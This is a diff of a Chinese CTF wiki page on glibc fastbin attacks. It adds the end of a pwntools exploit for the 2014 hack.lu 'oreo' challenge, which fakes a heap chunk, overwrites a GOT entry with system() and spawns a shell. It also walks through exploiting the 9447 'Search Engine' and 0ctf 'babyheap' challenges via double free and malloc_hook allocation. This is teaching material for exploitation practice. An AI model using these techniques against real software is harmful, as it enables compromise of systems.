+    <span class="c1"># now, oifle_cnt=1, we need set it = 0x40</span>
+    <span class="n">oifle</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="k">while</span> <span class="n">oifle</span> <span class="o">&lt;</span> <span class="mh">0x3f</span><span class="p">:</span>
+        <span class="c1"># set next link=NULL</span>
+        <span class="n">add</span><span class="p">(</span><span class="mi">25</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">27</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+        <span class="n">oifle</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">27</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804a2a8</span><span class="p">)</span>
+    <span class="c1"># set next link=0x0804A2A8, try to free a fake chunk</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">25</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="c1"># before free, we need to bypass some check</span>
+    <span class="c1"># fake chunk&#39;s size is 0x40</span>
+    <span class="c1"># 0x20 *&#39;a&#39; for padding the last fake chunk</span>
+    <span class="c1"># 0x40 for fake chunk&#39;s next chunk&#39;s prev_size</span>
+    <span class="c1"># 0x100 for fake chunk&#39;s next chunk&#39;s size</span>
+    <span class="c1"># set fake iofle&#39; next to be NULL</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="mh">0x20</span> <span class="o">*</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">52</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">)</span>
+    <span class="n">message</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="c1"># fastbin 0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL</span>
+    <span class="n">order</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Okay order submitted!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+    <span class="nb">print</span> <span class="s1">&#39;step 3. get shell&#39;</span>
+    <span class="c1"># modify free@got to system addr</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">oreo</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;strlen&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">20</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;system addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+    <span class="c1">#gdb.attach(p)</span>
+    <span class="n">message</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">exp</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>当然，该题目也可以使用 <code class="docutils literal"><span class="pre">fast</span> <span class="pre">bin</span> <span class="pre">attack</span></code> 中的其它技术来实现，可参考参考文献中的链接。</p>
 </div>
 </div>
 <div class="section" id="ctf-search-engine">
 <h2>2015 9447 CTF : Search Engine<a class="headerlink" href="#ctf-search-engine" title="永久链接至标题">¶</a></h2>
-<div class="section" id="id12">
-<h3>基本信息<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h3>
+<div class="section" id="id18">
+<h3>基本信息<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h3>
 <div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  2015_9447ctf_search-engine git:(master) file search
 search: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped
 ➜  2015_9447ctf_search-engine git:(master) checksec search
@@ -533,17 +749,21 @@ search: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
 </pre></div>
 </div>
 </div>
-<div class="section" id="id13">
-<h3>基本功能<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h3>
+<div class="section" id="id19">
+<h3>基本功能<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h3>
 <p>程序的基本功能是</p>
 <ul class="simple">
-<li>索引一个句子</li>
+<li>索引一个句子<ul>
 <li>大小v0，(unsigned int)(v0 - 1) &gt; 0xFFFD</li>
 <li>读取的字符串长度必须和给定的大小相等</li>
 <li>每次索引的句子都是直接在直接建立在前面的句子上的。</li>
-<li>在一个句子中搜索单词</li>
+</ul>
+</li>
+<li>在一个句子中搜索单词<ul>
 <li>大小v0，(unsigned int)(v0 - 1) &gt; 0xFFFD</li>
-<li>读取指定长度字符串</li>
+</ul>
+</li>
+<li>读取指定长度字符串<ul>
 <li>如果有回车标记<ul>
 <li>在指定长度内没有遇到回车，则读完没有设置NULL标记</li>
 <li>在指定长度内遇到回车，就截断返回。</li>
@@ -554,9 +774,11 @@ search: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
 </ul>
 </li>
 </ul>
+</li>
+</ul>
 </div>
-<div class="section" id="id14">
-<h3>词语结构体<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h3>
+<div class="section" id="id20">
+<h3>词语结构体<a class="headerlink" href="#id20" title="永久链接至标题">¶</a></h3>
 <p>通过分析索引句子的过程，我们可以得到词语的结构如下</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span>00000000 word_struct     struc ; (sizeof=0x28, mappedto_6)
 00000000 content         dq ?
@@ -570,8 +792,8 @@ search: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
 </pre></div>
 </div>
 </div>
-<div class="section" id="id15">
-<h3>堆内存相关操作<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h3>
+<div class="section" id="id21">
+<h3>堆内存相关操作<a class="headerlink" href="#id21" title="永久链接至标题">¶</a></h3>
 <p>分配</p>
 <ul class="simple">
 <li>malloc 40 字节为一个word结构体</li>
@@ -584,8 +806,8 @@ search: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
 <li>释放索引句子时未使用的单词结构</li>
 </ul>
 </div>
-<div class="section" id="id16">
-<h3>漏洞<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h3>
+<div class="section" id="id22">
+<h3>漏洞<a class="headerlink" href="#id22" title="永久链接至标题">¶</a></h3>
 <p><strong>索引句子读取字符串时无NULL结尾</strong></p>
 <p>在索引句子时 flag_enter 永远为 0，所以读取句子时最后没有 NULL 结尾。</p>
 <div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">_flag_enter</span> <span class="o">=</span> <span class="n">flag_enter</span><span class="p">;</span>
@@ -674,10 +896,10 @@ free(v1);
 被释放后会被放到 bin 中，当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。此外，当句子被 <code class="docutils literal"><span class="pre">memset</span></code> 的时候，单词虽然都变为了 <code class="docutils literal"><span class="pre">\x00</span></code>
 ，但是我们仍然可以通过两个 <code class="docutils literal"><span class="pre">\x00</span></code> 的比较来绕过 <code class="docutils literal"><span class="pre">memcmp</span></code> 的检测。</p>
 </div>
-<div class="section" id="id17">
-<h3>利用<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h3>
-<div class="section" id="id18">
-<h4>利用思路<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h4>
+<div class="section" id="id23">
+<h3>利用<a class="headerlink" href="#id23" title="永久链接至标题">¶</a></h3>
+<div class="section" id="id24">
+<h4>利用思路<a class="headerlink" href="#id24" title="永久链接至标题">¶</a></h4>
 <p>基本利用思路如下</p>
 <ul class="simple">
 <li>利用 unsorted bin 地址泄漏 libc 基地址</li>
@@ -708,7 +930,7 @@ free(v1);
 <h4>构造 fastbin 循环链表<a class="headerlink" href="#fastbin" title="永久链接至标题">¶</a></h4>
 <p>由于我们最后希望在 malloc_hook 处分配 chunk，而一般分配 malloc_hook 附近的 chunk 一般大小都是0x7f。即，我们所需要设置的设置的 fast bin 的数据字节部分的大小为 0x60。这里我们按照如下方式构造</p>
 <ol class="arabic simple">
-<li>分别索引句子a，索引句子b，索引句子c，则此时单词链表中索引的句子的相对顺序为c-&gt;b-&gt;a。假设句子 a 为’a’ * 0x5d+’ d ‘，句子 b 为 ‘b’ * 0x5d+’ d ‘，句子c类似。</li>
+<li>分别索引句子a，索引句子b，索引句子c，则此时单词链表中索引的句子的相对顺序为c-&gt;b-&gt;a。假设句子 a 为’a’ * 0x5d+‘d’，句子 b 为 ‘b’ * 0x5d+‘d’，句子c类似。</li>
 <li>索引单词d，三个均删除，则此时 fastbin 中的链表情况为 a-&gt;b-&gt;c-&gt;NULL，这是因为首先释放的是句子c，最后释放的是句子 a 。这时，搜索单词时<code class="docutils literal"><span class="pre">*i-&gt;sentence_ptr</span></code> 对于a, b 来说都是可以绕过的。</li>
 <li>我们此时再次删除搜索单词 <code class="docutils literal"><span class="pre">\x00</span></code>。首先遍历的是 c，但是 c 的验证不通过；其次遍历的是b，验证通过，我们将其释放；其次遍历的是a，验证通过，但是我们不删除。则此时 fastbin 的情况为
 b-&gt;a-&gt;b-&gt;a-&gt;…。即已经构成了double free b的情况。由于我们先前为了 leak libc 还建立一个句子，所以还有一个单词可以比较，这里我们也不删除。</li>
@@ -826,8 +1048,8 @@ libc.so.6  search.id0  search.id2  search.til
 </div>
 <div class="section" id="ctf-babyheap">
 <h2>2017 0ctf babyheap<a class="headerlink" href="#ctf-babyheap" title="永久链接至标题">¶</a></h2>
-<div class="section" id="id19">
-<h3>基本信息<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h3>
+<div class="section" id="id25">
+<h3>基本信息<a class="headerlink" href="#id25" title="永久链接至标题">¶</a></h3>
 <div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  2017_0ctf_babyheap git:(master) file babyheap
 babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped
 ➜  2017_0ctf_babyheap git:(master) checksec babyheap
@@ -841,8 +1063,8 @@ babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically li
 </div>
 <p>64位程序，保护全部开启。</p>
 </div>
-<div class="section" id="id20">
-<h3>基本功能<a class="headerlink" href="#id20" title="永久链接至标题">¶</a></h3>
+<div class="section" id="id26">
+<h3>基本功能<a class="headerlink" href="#id26" title="永久链接至标题">¶</a></h3>
 <p>程序是一个堆分配器，主要由以下四种功能</p>
 <div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">puts</span><span class="p">(</span><span class="s2">&quot;1. Allocate&quot;</span><span class="p">);</span>
 <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;2. Fill&quot;</span><span class="p">);</span>
@@ -950,15 +1172,15 @@ babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically li
 </div>
 <p>dump 就是输出对应索引 chunk 的内容。</p>
 </div>
-<div class="section" id="id21">
-<h3>利用思路<a class="headerlink" href="#id21" title="永久链接至标题">¶</a></h3>
+<div class="section" id="id27">
+<h3>利用思路<a class="headerlink" href="#id27" title="永久链接至标题">¶</a></h3>
 <p>可以确定的是，我们主要有的漏洞就是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下</p>
 <ul class="simple">
 <li>利用 unsorted bin 地址泄漏 libc 基地址。</li>
 <li>利用 fastbin attack 将chunk 分配到 malloc_hook 附近。</li>
 </ul>
-<div class="section" id="id22">
-<h4>泄漏 libc 基地址<a class="headerlink" href="#id22" title="永久链接至标题">¶</a></h4>
+<div class="section" id="id28">
+<h4>泄漏 libc 基地址<a class="headerlink" href="#id28" title="永久链接至标题">¶</a></h4>
 <p>由于我们是希望使用 unsorted bin 来泄漏 libc 基地址，所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能使 fastbin chunk，也不能和 top chunk 相邻。因为前者会被添加到 fastbin
 中，后者在不是fastbin 的情况下，会被合并到 top chunk 中。因此，我们这里构造一个 small bin chunk。在将该 chunk 释放到 unsorted bin 的同时，也需要让另外一个正在使用的 chunk 可以同时指向该 chunk
 的位置。这样才可以进行泄漏。具体设计如下</p>
@@ -1082,11 +1304,18 @@ bin中的chunk，将其放入到对应的bin中，之后会再次尝试分配 ch
 </div>
 </div>
 </div>
-<div class="section" id="id23">
-<h2>参考文献<a class="headerlink" href="#id23" title="永久链接至标题">¶</a></h2>
+<div class="section" id="id29">
+<h2>题目<a class="headerlink" href="#id29" title="永久链接至标题">¶</a></h2>
+<ul class="simple">
+<li>L-CTF2016–pwn200</li>
+</ul>
+</div>
+<div class="section" id="id30">
+<h2>参考文献<a class="headerlink" href="#id30" title="永久链接至标题">¶</a></h2>
 <ul class="simple">
 <li><a class="reference external" href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/">https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/</a></li>
 <li><a class="reference external" href="http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></li>
+<li><a class="reference external" href="https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717">https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717</a></li>
 </ul>
 </div>
 </div>
@@ -1182,20 +1411,32 @@ bin中的chunk，将其放入到对应的bin中，之后会再次尝试分配 ch
 <li class="toctree-l4"><a class="reference internal" href="#id8">小总结</a></li>
 </ul>
 </li>
-<li class="toctree-l3"><a class="reference internal" href="#arbitrary-alloc">Arbitrary Alloc</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#alloc-to-stack">Alloc to Stack</a><ul>
 <li class="toctree-l4"><a class="reference internal" href="#id9">介绍</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#id10">演示</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#id11">小总结</a></li>
 </ul>
 </li>
+<li class="toctree-l3"><a class="reference internal" href="#arbitrary-alloc">Arbitrary Alloc</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id12">介绍</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id13">演示</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id14">小总结</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#hack-lu-oreo">2014 hack.lu oreo</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id15">基本分析</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id16">基本功能</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id17">利用</a></li>
+</ul>
+</li>
 <li class="toctree-l3"><a class="reference internal" href="#ctf-search-engine">2015 9447 CTF : Search Engine</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#id12">基本信息</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id13">基本功能</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id14">词语结构体</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id15">堆内存相关操作</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id16">漏洞</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id17">利用</a><ul>
-<li class="toctree-l5"><a class="reference internal" href="#id18">利用思路</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id18">基本信息</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id19">基本功能</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id20">词语结构体</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id21">堆内存相关操作</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id22">漏洞</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id23">利用</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#id24">利用思路</a></li>
 <li class="toctree-l5"><a class="reference internal" href="#libc">泄漏 libc 地址</a></li>
 <li class="toctree-l5"><a class="reference internal" href="#fastbin">构造 fastbin 循环链表</a></li>
 <li class="toctree-l5"><a class="reference internal" href="#malloc-hook-chunk">分配 malloc_hook 附近chunk</a></li>
@@ -1205,16 +1446,17 @@ bin中的chunk，将其放入到对应的bin中，之后会再次尝试分配 ch
 </ul>
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#ctf-babyheap">2017 0ctf babyheap</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#id19">基本信息</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id20">基本功能</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id21">利用思路</a><ul>
-<li class="toctree-l5"><a class="reference internal" href="#id22">泄漏 libc 基地址</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id25">基本信息</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id26">基本功能</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id27">利用思路</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#id28">泄漏 libc 基地址</a></li>
 <li class="toctree-l5"><a class="reference internal" href="#chunkmalloc-hook">分配chunk到malloc_hook附近</a></li>
 </ul>
 </li>
 </ul>
 </li>
-<li class="toctree-l3"><a class="reference internal" href="#id23">参考文献</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id29">题目</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id30">参考文献</a></li>
 </ul>
 </li>
 <li class="toctree-l2"><a class="reference internal" href="house_of_force.html">House Of Force</a></li>
